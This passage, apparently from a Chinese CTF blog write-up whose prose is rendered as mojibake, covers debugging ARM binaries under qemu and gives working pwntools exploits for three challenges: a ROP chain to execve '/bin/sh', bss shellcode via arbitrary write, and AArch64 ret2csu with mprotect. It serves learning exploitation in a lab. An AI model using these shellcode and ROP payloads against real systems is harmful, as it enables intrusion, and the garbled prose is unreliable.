./pwn</span><br></pre></td></tr></table></figure><p>ç„¶åå¯åŠ¨gdb-multiarchï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set architecture arm/aarch64  #æŒ‡å®šç›®æ ‡æ¶æ„</span><br><span class="line">target remote localhost:1234/8888</span><br></pre></td></tr></table></figure><p><strong>è¿è¡Œpwnè„šæœ¬æ—¶é™„åŠ è¿›ç¨‹</strong>ï¼š</p><p>1.ç»™ç¨‹åºåŠ ä¸ªpause()ï¼Œqemuæ¨¡æ‹Ÿæ—¶è®¾ç½®-g portï¼Œç„¶ågdb-multiarché™„åŠ ä¸Šå»ã€‚</p><p>2.å‘ç¾¤uè¯·æ•™åï¼Œå¯ä»¥é€šè¿‡pwntoolsä¸­çš„attaché™„åŠ è¿›ç¨‹ä¸Šå»ã€‚ä½†æ˜¯å¥½åƒåªèƒ½åœ¨ç¨‹åºäº¤äº’å‰attachä¸Šå»ï¼Œä¸ç„¶ä¼šæ— æ³•äº¤äº’</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io = process(&#x27;qemu-arm -L ./ -g 2222 pwnfile&#x27;.split(&#x27; &#x27;), env=env)</span><br><span class="line">gdb.attach((&#x27;127.0.0.1&#x27;, 2222), &#x27;&#x27;&#x27;b *_start&#x27;&#x27;&#x27;, exe=&#x27;pwnfile&#x27;)</span><br><span class="line">sleep(2)</span><br></pre></td></tr></table></figure><p>ç«¯å£å†²çªï¼šnetstat -lnpæŸ¥çœ‹å ç”¨PID    kill -9 PID åˆ é™¤è¿›ç¨‹ </p><p><strong>ä¸€äº›æœ‰å…³qemuçš„çŸ¥è¯†</strong>ï¼šqemuèµ·çš„è™šæ‹Ÿç¯å¢ƒä¿æŠ¤å…¨å…³ã€‚å…³é—­äº†ASLRï¼šå¯åŠ¨çš„åœ°å€æ˜¯å›ºå®šçš„ï¼›å…³é—­äº†NXï¼šshellcodeå¯æ‰§è¡Œã€‚é€šè¿‡åˆ¤æ–­è¿œç¨‹ç¯å¢ƒæ˜¯qemuèµ·çš„è¿˜æ˜¯å®ä½“æœºèµ·çš„ï¼Œå¦‚æœæ˜¯qemuä¸€èˆ¬ç›´æ¥ç”¨ret2shellcodeï¼Œå¦åˆ™æ³„éœ²+attackã€‚å³ä½¿æ‰€ç»™çš„äºŒè¿›åˆ¶æ–‡ä»¶å¼€äº†NXå’Œpieï¼Œä¹Ÿåªæ˜¯å¯¹çœŸæœºç¯å¢ƒæœ‰æ•ˆï¼Œqemuä¸­è¿˜æ˜¯æ²¡æœ‰ä¿æŠ¤ã€‚</p><h1 id="é¢˜ç›®ä¸€ï¼š32ä½-armæ¶æ„-é™æ€"><a href="#é¢˜ç›®ä¸€ï¼š32ä½-armæ¶æ„-é™æ€" class="headerlink" title="é¢˜ç›®ä¸€ï¼š32ä½ armæ¶æ„ é™æ€"></a>é¢˜ç›®ä¸€ï¼š32ä½ armæ¶æ„ é™æ€<a id="first"></a></h1><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121123677.png" alt="image-20240712112344579"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -g 1234 ./typo</span><br><span class="line"></span><br><span class="line">gdb-multiarch ./typo</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> architecture arm</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">target remote localhost:1234</span></span><br></pre></td></tr></table></figure><p>ç”±äºæ˜¯é™æ€é“¾æ¥ï¼Œæ‰€ä»¥å‡½æ•°ä¼šä¼šå¾ˆä¹±ï¼Œå®šä½ä¸»å‡½æ•°æ–¹æ³•ï¼š</p><ol><li>é€šè¿‡å­—ç¬¦ä¸²æ‰¾åˆ°ä¸€äº›ç‰¹å¾å­—ç¬¦ä¸²ï¼Œé¢˜ç›®ä¸­çš„æè¿°ä¹‹ç±»çš„ï¼Œæ ¹æ®äº¤å‰è°ƒç”¨ï¼Œä¸æ–­è·Ÿè¿›çˆ¶å‡½æ•°ï¼Œåˆ¤æ–­å½“å‰å‡½æ•°æ˜¯å¦ä¸ºä¸»å‡½æ•°</li><li>å®šä½_startå‡½æ•°ï¼Œåˆ†æ_startè°ƒç”¨ï¼Œå®ƒæœ€ç»ˆä¼šè°ƒç”¨mianå‡½æ•°æˆ–è€…æ˜¯å°è£…çš„__libc_start_mainå‡½æ•°</li></ol><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121143318.png" alt="image-20240712114313268"></p><p>å‘ç°sub_8F00ä¸ºmainå‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121338981.png" alt="image-20240712133835929"></p><p>ç„¶åè¾¹è°ƒè¾¹é€†ï¼ŒçŒœæµ‹ä¸€äº›å‡½æ•°ä½œç”¨ </p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121534727.png" alt="image-20240712152641078"></p><p>åœ¨0x221c8å¤„ä¸‹æ–­ç‚¹</p><p>åœ¨å¾ªç¯ä¸­ï¼Œå‡½æ•°ä¼šæ–­åœ¨è¯¥å¤„ï¼Œè¾“å…¥0x200å­—èŠ‚æ•°æ®</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121341151.png" alt="image-20240712134108103"></p><p>è°ƒç”¨å®Œreadä»¥åï¼Œæ–­ç‚¹ä¸‹åœ¨0x00008d60</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121354166.png" alt="image-20240712135409083"></p><p>R11 -&gt;  0xfffef064 â€”â–¸ 0x9058 â—‚â€” str r0, [fp, #-0x20] &#x2F;* â€˜ â€˜ *&#x2F;  ï¼Œ0x9058æŒ‡ä»¤æ˜¯readin()çš„ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œå½“æˆ‘ä»¬è¦†ç›–äº†0xfffef064ä¸­çš„å€¼ä¸ºå¸ƒç½®å¥½çš„shellcodeåœ°å€ï¼Œå°±èƒ½æ§åˆ¶ç¨‹åºåœ¨è°ƒç”¨å®Œreadin()åï¼Œé€šè¿‡r11æ¥æ¢å¤æ¢å¤PCã€‚åç§»ä¸º0x70å­—èŠ‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x 0xfffef064-0xfffeeff4</span><br><span class="line">$1 = 0x70</span><br></pre></td></tr></table></figure><p>ç”±äºæ²¡æœ‰å¼€NXä¿æŠ¤ï¼Œæ ˆä¸Šshellcodeå¯æ‰§è¡Œï¼Œå¯ä»¥æ§åˆ¶R11 -&gt; shellcode_addrï¼Œä½†æ˜¯shellcodeå†™åˆ°æ ˆä¸Šï¼Œéœ€è¦æ ˆåœ°å€ï¼Œä¸è¿‡qemuèµ·çš„ç¯å¢ƒæ²¡å¼€ASLRï¼Œå¯ä»¥ç›´æ¥ç”¨æ ˆåœ°å€è¿”å›ã€‚</p><p>é€šè¿‡ROPgadgetæ¥æ‰“ï¼Œæ„é€ ROPé“¾ï¼Œæ‰§è¡Œsystem(â€œ&#x2F;bin&#x2F;shâ€)ï¼Œæˆ–è€…execve(â€œ&#x2F;bin&#x2F;shâ€, 0, 0)</p><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“ï¼šarmå‡½æ•°è°ƒç”¨å‚æ•°è§„åˆ™ï¼šR0~R4ï¼Œå†æ˜¯æ ˆä¸Šï¼ŒR7ä¸ºç³»ç»Ÿè°ƒç”¨å·ï¼Œr15&#x3D;PCæŒ‡å‘ä¸‹ä¸€æ¡å‘½ä»¤åœ°å€</p><p>execveç³»ç»Ÿè°ƒç”¨å·0xbï¼ŒæŒŸæŒPCæ‰§è¡Œsvcä¸­æ–­ï¼Œä½¿ç”¨ROPgadgetæ‰¾ä¸åˆ°pop r15çš„gadget</p><blockquote><p>execve(â€œ&#x2F;bin&#x2F;shâ€, 0, 0)   â€“&gt;  r0 &#x3D; bin_sh_addr   r1&#x3D;0   r2&#x3D;0   r7&#x3D;b</p><p>pc &#x3D; svc_addr </p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121418124.png" alt="image-20240712141834090"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121449651.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x00020904 : pop &#123;r0, r4, pc&#125;</span><br><span class="line">0x00068bec : pop &#123;r1, pc&#125;</span><br><span class="line">0x00014068 : pop &#123;r7, pc&#125;</span><br><span class="line">0x0004df00 : mov r2, #0 ; mov r0, r2 ; pop &#123;r3, r4, r5, pc&#125;</span><br><span class="line">0x0000fed0 : svc #0 ; pop &#123;r3, r4, r5, r6, r7, pc&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯æŠŠä»–ä»¬ç»„è£…èµ·æ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;arm&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm&#x27;</span>,<span class="string">&#x27;./typo&#x27;</span>])</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;quit\n&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x00020904 : pop &#123;r0, r4, pc&#125;</span></span><br><span class="line"><span class="comment"># 0x00068bec : pop &#123;r1, pc&#125;</span></span><br><span class="line"><span class="comment"># 0x00014068 : pop &#123;r7, pc&#125;</span></span><br><span class="line"><span class="comment"># 0x0004df00 : mov r2, #0 ; mov r0, r2 ; pop &#123;r3, r4, r5, pc&#125;</span></span><br><span class="line"><span class="comment"># 0x0000fed0 : svc #0 ; pop &#123;r3, r4, r5, r6, r7, pc&#125;</span></span><br><span class="line"></span><br><span class="line">r0_r4 =  <span class="number">0x00020904</span></span><br><span class="line">r1    = <span class="number">0x00068bec</span></span><br><span class="line">r7    = <span class="number">0x00014068</span></span><br><span class="line">r3_r4_r5 = <span class="number">0x0004df00</span>  <span class="comment">#r0=r2=0</span></span><br><span class="line">svc   = <span class="number">0x0000fed0</span></span><br><span class="line">bin_sh= <span class="number">0x0006C384</span></span><br><span class="line"></span><br><span class="line">payload = flat([ cyclic(<span class="number">112</span>), p32(r3_r4_r5), p32(<span class="number">0</span>)*<span class="number">3</span>,   <span class="comment">#r2 = 0</span></span><br><span class="line">                p32(r0_r4), p32(bin_sh) , p32(<span class="number">0</span>),        <span class="comment">#r0 = bin_sh_addr</span></span><br><span class="line">                p32(r1), p32(<span class="number">0</span>),                         <span class="comment">#r1 = 0</span></span><br><span class="line">                p32(r7), p32(<span class="number">0xb</span>),                       <span class="comment">#r7 = 0xb</span></span><br><span class="line">                p32(svc)])                               <span class="comment">#pc = svc_addr</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="æ¢å¤ç¬¦å·è¡¨"><a href="#æ¢å¤ç¬¦å·è¡¨" class="headerlink" title="æ¢å¤ç¬¦å·è¡¨"></a><strong>æ¢å¤ç¬¦å·è¡¨</strong><a id="func"></a></h2><p>çœ‹äº†winmtå¸ˆå‚…çš„æ–‡ç« ï¼Œå¯ä»¥ä½¿ç”¨<a href="https://github.com/Reverier-Xu/Rizzo-IDA">Rizzo</a>æ’ä»¶æ¥ä¿®å¤ç¬¦å·è¡¨:</p><ol><li>å…ˆå°†å¯¹åº”çš„libc.soä¸‹è½½ä¸‹æ¥</li><li>ç„¶åç”¨IDAæ‰“å¼€libc.soï¼Œä½¿ç”¨Rizzoå¯¼å‡ºä¸ºlibc.so.riz</li><li>æ‰“å¼€ç›®æ ‡ç¨‹åºï¼Œä½¿ç”¨RizzoåŠ è½½.riz</li></ol><p>ä½†æ˜¯æœ¬åœ°æ²¡åŠ è½½å‡ºæ¥   ~_~   </p><p>éœ€è¦çŸ¥é“ç¼–è¯‘çš„libcç‰ˆæœ¬æ‰èƒ½ä¿®å¤ï¼Œç½‘ä¸Šæ‰¾çš„libcæ˜¯<a href="https://launchpad.net/ubuntu/bionic/arm64/libc6/2.27-3ubuntu1">2.27-3ubuntu1 : libc6 : arm64 : Bionic (18.04) : Ubuntu (launchpad.net)</a>ï¼Œå¯èƒ½æ˜¯libcæ‰¾é”™äº†</p><p>å°è¯•ç”¨äº†é˜¿é‡Œå…¬å¼€çš„<a href="https://github.com/aliyunav/Finger">finger</a>å‡½æ•°è¯†åˆ«æ’ä»¶åˆ†æï¼Œè²Œä¼¼armæ¶æ„çš„å‡½æ•°è¯†åˆ«ä¸å‡ºæ¥ã€‚ã€‚ã€‚</p><p>ä¹Ÿè¯•äº†ä¸‹<a href="https://github.com/push0ebp/sig-database">sig-database</a>é‡Œé¢æä¾›çš„sigæ–‡ä»¶ï¼Œåˆ©ç”¨idaè‡ªå¸¦çš„FLIRTè¿›è¡Œç­¾åï¼Œ2.23åˆ°2.27éƒ½è¯•äº†ä¸€é€šï¼ŒåªåŒ¹é…å‡ºæ¥ä¸‰ä¸ªå‡½æ•°ï¼Œ2.28+ä½œè€…æ²¡æœ‰æ„å»ºarmæ¶æ„çš„sigæ–‡ä»¶äº†ã€‚</p><p>å¾ˆæ˜¯è®©äººéƒé—·ï¼Œä¸è¿‡å­¦ä¹ äº†å¾ˆå¤šæ¢å¤ç¬¦å·è¡¨çš„æ–¹æ³•ã€‚^-^</p><h1 id="é¢˜ç›®äºŒï¼š32ä½-armæ¶æ„-åŠ¨æ€"><a href="#é¢˜ç›®äºŒï¼š32ä½-armæ¶æ„-åŠ¨æ€" class="headerlink" title="é¢˜ç›®äºŒï¼š32ä½ armæ¶æ„ åŠ¨æ€"></a>é¢˜ç›®äºŒï¼š32ä½ armæ¶æ„ åŠ¨æ€<a id="second"></a></h1><p>InCTF-2018 wARMup</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121507370.png" alt="image-20240712150714341"></p><p>æ²¡å¼€pie   32ä½armæ¶æ„bssæ®µå¯æ‰§è¡Œ</p><p>ä¸»å‡½æ•°æº¢å‡º0x10å­—èŠ‚</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121510197.png" alt="image-20240712151053165"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121550049.png" alt="image-20240712155049004"></p><p>readé€šè¿‡r11-0x68æ¥è®¾ç½®ç›®æ ‡åœ°å€ï¼Œå¦‚æœæˆ‘ä»¬è®¾ç½®å‡½æ•°çš„è¿”å›åœ°å€ä¸º0x1052cï¼Œæ§åˆ¶R11çš„å€¼ï¼Œå°±èƒ½å®ç°ä»»æ„åœ°å€å†™</p><p>å‡½æ•°æœ€åä¼šå°†SPæŒ‡é’ˆå‘ä½åœ°å€å‡å°‘4å­—èŠ‚ï¼Œåé¢æ‰§è¡Œçš„ POP {R11, PC} ä»SPå¼€å§‹ï¼Œæ‰€ä»¥å¡«å……çš„payloadé•¿åº¦åº”è¯¥ä¸º $r11 - $r1 -4 &#x3D; 0x64ï¼Œåé¢å››å­—èŠ‚ä¸ºR11ï¼Œæ¥ä¸‹æ¥æ‰ä¼šå¼¹ç»™PCã€‚</p><p>å…ˆæ„é€ ä»»æ„å†™ï¼Œå¾€bssæ®µä¸Šå†™shellcodeï¼Œç„¶åå†æ”¹è¿”å›å‡½æ•°åœ°å€æ‰§è¡Œshellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;arm&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;qemu-arm -L /usr/arm-linux-gnueabihf/ -g 4444 ./wARMup&#x27;, shell = True)</span></span><br><span class="line">io = process(<span class="string">&#x27;qemu-arm -L /usr/arm-linux-gnueabihf/ ./wARMup&#x27;</span>, shell = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x021100</span></span><br><span class="line">payload = flat([cyclic(<span class="number">0x64</span>), p32(bss+<span class="number">0x68</span>),   <span class="comment">#r11 -&gt; bss</span></span><br><span class="line">                p32(<span class="number">0x01052C</span>)                  <span class="comment">#read(0, bss-0x68, 0x78)</span></span><br><span class="line">                ])</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Welcome to bi0s CTF!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    add r0, pc, #12</span></span><br><span class="line"><span class="string">    mov r1, #0</span></span><br><span class="line"><span class="string">    mov r2, #0</span></span><br><span class="line"><span class="string">    mov r7, #11</span></span><br><span class="line"><span class="string">    svc 0</span></span><br><span class="line"><span class="string">    .ascii &quot;/bin/sh\\0&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = shellcode.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p32(bss)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>ä¸è¿‡<a href="https://www.cnblogs.com/ZIKH26/articles/16077191.html">ZIKH26</a>å¸ˆå‚…çš„payloadæœ‰äº›ç†ä¸æ¸…</p><h1 id="é¢˜ç›®ä¸‰ï¼š64ä½-aarch64æ¶æ„-åŠ¨æ€"><a href="#é¢˜ç›®ä¸‰ï¼š64ä½-aarch64æ¶æ„-åŠ¨æ€" class="headerlink" title="é¢˜ç›®ä¸‰ï¼š64ä½ aarch64æ¶æ„ åŠ¨æ€"></a>é¢˜ç›®ä¸‰ï¼š64ä½ aarch64æ¶æ„ åŠ¨æ€<a id="third"></a></h1><p>ä¸Šæµ·éª‡ææ¯ 2018 baby_arm</p><blockquote><p>sky123å¸ˆå‚…å†™äº†ï¼Œå¯ä»¥ä¿®æ”¹pwndbg&#x2F;lib&#x2F;regs.pyä¸­çš„å¯„å­˜å™¨çš„å®šä¹‰åï¼Œè¿™æ ·pwndbgå°±èƒ½æ˜¾ç¤ºå‡º$31$30ç­‰å¯„å­˜å™¨åç§°</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121840669.png" alt="image-20240712184024595"></p><p>å¾€bssæ®µä¸Šå†™æ•°æ®ï¼Œç„¶åå­˜åœ¨æ ˆæº¢å‡º</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121841597.png" alt="image-20240712184140558"></p><p>aarch64æŒ‡ä»¤é›†ä¸­ï¼šx0~x7ä¼ å‚  x29 æ ˆé¡¶æŒ‡é’ˆ  x30 LR</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> X0   0x0</span><br><span class="line"> X1   0x40007fff00 â—‚â€” 0x6161616261616161 (&#x27;aaaabaaa&#x27;)</span><br><span class="line"> X2   0x200</span><br><span class="line"> X3   0x40009b1500 â—‚â€” 0</span><br><span class="line"> X4   0x0</span><br><span class="line"> X5   0x9f075092a1c1abdb</span><br><span class="line"> X6   0x40009adb10 â—‚â€” 0</span><br><span class="line"> X7   0x40000000000</span><br><span class="line"> X8   0x3f</span><br><span class="line"> X9   0xffff</span><br><span class="line"> X10  0x0</span><br><span class="line"> X11  0x0</span><br><span class="line"> X12  0x4000841e48 â—‚â€” udf #0</span><br><span class="line"> X13  0x0</span><br><span class="line"> X14  0x0</span><br><span class="line"> X15  0x6fffff47</span><br><span class="line"> X16  0x411028 â€”â–¸ 0x4000901b40 â—‚â€” stp x29, x30, [sp, #-0x30]!</span><br><span class="line"> X17  0x4000901b40 â—‚â€” stp x29, x30, [sp, #-0x30]!</span><br><span class="line"> X18  0x73516240</span><br><span class="line"> X19  0x400868 â—‚â€” stp x29, x30, [sp, #-0x40]!</span><br><span class="line"> X20  0x0</span><br><span class="line"> X21  0x400610 â—‚â€” mov x29, #0</span><br><span class="line"> X22  0x0</span><br><span class="line"> X23  0x0</span><br><span class="line"> X24  0x0</span><br><span class="line"> X25  0x0</span><br><span class="line"> X26  0x0</span><br><span class="line"> X27  0x0</span><br><span class="line"> X28  0x0</span><br><span class="line"> X29  0x6161617261616171 (&#x27;qaaaraaa&#x27;)</span><br><span class="line"> X30  0x6161617461616173 (&#x27;saaataaa&#x27;)</span><br><span class="line"> SP   0x40007fff50 â—‚â€” 0x6161617661616175 (&#x27;uaaavaaa&#x27;)</span><br><span class="line">*PC   0x61617461616173</span><br></pre></td></tr></table></figure><p>åœ¨mainå‡½æ•°è¿”å›æ—¶ï¼Œx30-&gt;â€˜saaataaaâ€™ offset&#x3D;72</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;aarch64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-aarch64&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/aarch64-linux-gnu/&#x27;</span>,<span class="string">&#x27;./shanghai_baby_arm&#x27;</span>])</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Name:&#x27;</span>, shellcode)</span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">payload = cyclic(<span class="number">72</span>) + p64(<span class="number">0x411068</span>)  <span class="comment">#PC -&gt; bss_addr &lt;- shellcode</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>ret2csu</p><p>mprotect(bss, 0x1000, 7)  -&gt; x0 &#x3D; bss_addr   x1&#x3D;0x1000  x2&#x3D;7  x3&#x3D;mprotect_plt</p><p>csu -&gt; x24 &#x3D; bss_addr x23 &#x3D; 0x1000 x22 &#x3D; 7 x21&#x3D;mprotect_plt x19&#x3D;0  x20&#x3D;1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004008AC loc_4008AC                              ; CODE XREF: init+60â†“j --&gt;csu2</span><br><span class="line">.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]</span><br><span class="line">.text:00000000004008B0                 MOV             X2, X22</span><br><span class="line">.text:00000000004008B4                 MOV             X1, X23</span><br><span class="line">.text:00000000004008B8                 MOV             W0, W24</span><br><span class="line">.text:00000000004008BC                 ADD             X19, X19, #1</span><br><span class="line">.text:00000000004008C0                 BLR             X3</span><br><span class="line">.text:00000000004008C4                 CMP             X19, X20</span><br><span class="line">.text:00000000004008C8                 B.NE            loc_4008AC</span><br><span class="line">.text:00000000004008CC</span><br><span class="line">.text:00000000004008CC loc_4008CC                              ; CODE XREF: init+3Câ†‘j   --&gt;csu1</span><br><span class="line">.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]</span><br><span class="line">.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]</span><br><span class="line">.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]</span><br><span class="line">.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40</span><br><span class="line">.text:00000000004008DC                 RET</span><br></pre></td></tr></table></figure><p>å¸ƒç½®csu1ï¼šå…ˆå¸ƒç½®x29å’Œx30ï¼Œx30å­˜å‚¨å‡½æ•°è°ƒç”¨çš„è¿”å›åœ°å€ï¼Œåœ¨æ‰§è¡Œretåè°ƒç”¨ï¼Œæ§åˆ¶x30æŒ‡å‘csu2ï¼Œå®ç°ç¬¬ä¸€æ¬¡æ§åˆ¶æµæŒŸæŒï¼›ç„¶åæ§åˆ¶å¯¹åº”å¯„å­˜å™¨åœ¨csu2ä¸­çš„èµ‹å€¼</p><p>æ§åˆ¶csu2ï¼šæŒ‰ç…§å¯¹åº”å¯„å­˜å™¨è¿›è¡Œèµ‹å€¼ï¼Œç„¶åx19+1ï¼Œä¼šä¸x20æ¯”è¾ƒï¼Œå¦‚æœç›¸ç­‰å°±ä¼šç»§ç»­æ‰§è¡Œcsu1ï¼Œæ­¤æ—¶é€šè¿‡å¸ƒç½®æ ˆç©ºé—´å¯ä»¥å†æ¬¡æ§åˆ¶x30ï¼Œæ‰§è¡Œåˆ°retæ—¶èƒ½å¤Ÿå®ç°ç¬¬äºŒæ¬¡æ§åˆ¶æµæŒŸæŒã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;aarch64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process([&#x27;qemu-aarch64&#x27;,&#x27;-L&#x27;,&#x27;/usr/aarch64-linux-gnu/&#x27;,&#x27;-g&#x27;,&#x27;9999&#x27;, &#x27;./shanghai_baby_arm&#x27;])</span></span><br><span class="line">io = process([<span class="string">&#x27;qemu-aarch64&#x27;</span>,<span 